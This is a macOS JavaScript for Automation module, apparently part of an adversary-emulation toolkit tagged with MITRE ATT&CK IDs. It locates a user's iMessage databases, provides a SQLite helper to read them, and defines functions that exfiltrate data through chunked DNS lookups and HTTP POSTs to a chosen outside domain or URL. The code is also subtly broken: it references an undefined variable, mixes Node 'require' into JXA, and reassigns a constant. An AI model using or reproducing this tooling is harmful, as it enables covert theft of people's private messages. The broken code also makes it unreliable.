ObjC.import('Foundation');
ObjC.import('SQLite3');

// MITRE ATT&CK Reference var map
const TACTIC = {
    COLLECTION: "Collection",
    EXFILTRATION: "Exfiltration",
    DEFENSE_EVASION: "Defense Evasion"
};

const TTP_ID = {
    COLLECTION_DATA_FROM_LOCAL_SYSTEM: "T1005",
    EXFILTRATION_OVER_C2_CHANNEL: "T1041",
    OBFUSCATED_FILES_OR_INFORMATION: "T1027"
};

// Script metadata
const SCRIPT_NAME = "msgIntel";
const SCRIPT_VERSION = "1.0";

// Logging
const LOG_DIR = "../../logs";
const LOG_FILE_NAME = `${TTP_ID.COLLECTION_DATA_FROM_LOCAL_SYSTEM}_${SCRIPT_NAME}.log`;
let LOG_ENABLED = false;

// Get user information
const USER_INFO = {
    username: $.NSUserName().js,
    homeDir: $.NSHomeDirectory().js
};

// Database paths
const DB_PATHS = {
    messages: `${homeDir}/Library/Messages/chat.db`,
    nicknames: `${homeDir}/Library/Messages/NickNameCache/nickNameKeyStore.db`,
    handleSharing: `${homeDir}/Library/Messages/NickNameCache/handleSharingPreferences.db`,
    collaborationNotices: `${homeDir}/Library/Messages/CollaborationNoticeCache/collaborationNotices.db`
};

// Command paths
const CMD = {
    SQLITE3: '/usr/bin/sqlite3'
};

// Utility Functions
function debug(message) {
    if (LOG_ENABLED) {
        console.log(`[DEBUG] ${message}`);
    }
}

function log(message, level = "INFO") {
    const timestamp = new Date().toISOString();
    const logMessage = `[${level}] ${timestamp} - ${message}`;
    
    if (LOG_ENABLED) {
        const logPath = `${LOG_DIR}/${LOG_FILE_NAME}`;
        const logFile = $.NSFileHandle.fileHandleForWritingAtPath(logPath);
        if (!logFile) {
            $.NSFileManager.defaultManager.createFileAtPathContentsAttributes(logPath, $.NSData.alloc.init, null);
            logFile = $.NSFileHandle.fileHandleForWritingAtPath(logPath);
        }
        logFile.seekToEndOfFile;
        logFile.writeData($.NSString.alloc.initWithUTF8String(`${logMessage}\n`).dataUsingEncoding($.NSUTF8StringEncoding));
        logFile.closeFile;
    }
    
    console.log(logMessage);
}

function runSQLQuery(dbPath, query) {
    let db = Ref();
    let status = $.sqlite3_open(dbPath, db);
    
    if (status === 0) {
        let stmt = Ref();
        status = $.sqlite3_prepare_v2(db[0], query, -1, stmt, null);
        
        if (status === 0) {
            let result = [];
            while ($.sqlite3_step(stmt[0]) === 100) {
                let row = {};
                for (let i = 0; i < $.sqlite3_column_count(stmt[0]); i++) {
                    let columnName = $.sqlite3_column_name(stmt[0], i).js;
                    let value = $.sqlite3_column_text(stmt[0], i);
                    row[columnName] = value ? ObjC.unwrap(value) : null;
                }
                result.push(row);
            }
            $.sqlite3_finalize(stmt[0]);
            $.sqlite3_close(db[0]);
            return result;
        }
        $.sqlite3_close(db[0]);
    }
    return null;
}

// Networking and Exfiltration
const net = require('net');
const dns = require('dns');
const https = require('https');

function exfilViaDNS(data, domain) {
    debug(`Exfiltrating data via DNS to ${domain}`);
    const chunks = chunkData(data, 63);  // DNS labels are limited to 63 characters
    chunks.forEach((chunk, index) => {
        const subdomain = `${chunk}.${index}.${domain}`;
        $.NSHost.hostWithName(subdomain);
    });
}

function exfilViaHTTP(data, url) {
    debug(`Exfiltrating data via HTTP to ${url}`);
    const request = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
    request.setHTTPMethod('POST');
    request.setHTTPBody($.NSString.alloc.initWithString(JSON.stringify(data)).dataUsingEncoding($.NSUTF8StringEncoding));
    
    const response = Ref();
    const error = Ref();
    $.NSURLConnection.sendSynchronousRequestReturningResponseError(request, response, error);
    
    if (error[0]) {
        console.log(`Error during HTTP exfiltration: ${error[0].localizedDescription}`);
    } else {
        debug("HTTP exfiltration successful");
    }
}

function chunkData(data, size) {
    const chunks = [];
    for (let i = 0; i < data.length; i += size) {
        chunks.push(data.slice(i, i + size));
    }
    return chunks;
}

// Export functions and constants
module.exports = {
    TACTIC,
    TTP_ID,
    SCRIPT_NAME,
    SCRIPT_VERSION,
    DB_PATHS,
    CMD,
    debug,
    log,
    runSQLQuery,
    exfilViaDNS,
    exfilViaHTTP
};
